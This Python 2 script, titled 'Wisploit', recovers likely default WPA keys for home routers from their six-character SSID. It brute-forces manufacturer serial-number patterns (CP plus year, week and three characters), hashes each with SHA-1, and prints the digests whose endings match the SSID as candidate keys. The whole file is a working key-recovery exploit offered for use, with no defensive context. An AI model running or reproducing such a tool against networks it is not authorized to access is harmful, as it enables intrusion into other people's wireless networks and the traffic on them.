#!/usr/bin/python
"""
 Wisploit

 Author: styx00
 Version: 1.0
"""
import sys
from itertools import product
import hashlib

if len(sys.argv) != 2:
    print "Usage:\n    wisploit.py <ssid>"
    sys.exit(1)

ssid = sys.argv[1].lower().strip()
if len(ssid) != 6:
    print "SSID should be 6 characters!"
    sys.exit(1)

# The following list represents the hexadecimal values of: 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
hexa = ["30","31","32","33","34","35","36","37","38","39","41","42","43","44","45","46","47","48","49","4A","4B","4C","4D","4E","4F","50","51","52","53","54","55","56","57","58","59","5A"]
keys = []

for year in range(0,13):
    print "Searching year 20%02d..." % (year)
    sn_year = "CP%02d" % (year)

    for week in range(1,53):
        sn_week = "%s%02d" % (sn_year, week)

        for xxx in product(hexa, repeat=3):
            sha1xxx = hashlib.sha1(sn_week + "".join(xxx)).hexdigest()
            if sha1xxx.endswith(ssid):
                keys.append(sha1xxx[:10].upper())
                print "\033[0;32mPossible key found = \033[0;31m%s\033[0m" % (sha1xxx[:10].upper())

print "\n\033[0;32mPossible keys found for \033[0;34m%s\033[0m\033[0;32m:\n\033[0;31m%s\033[0m" % (ssid.upper(), "\n".join(keys))
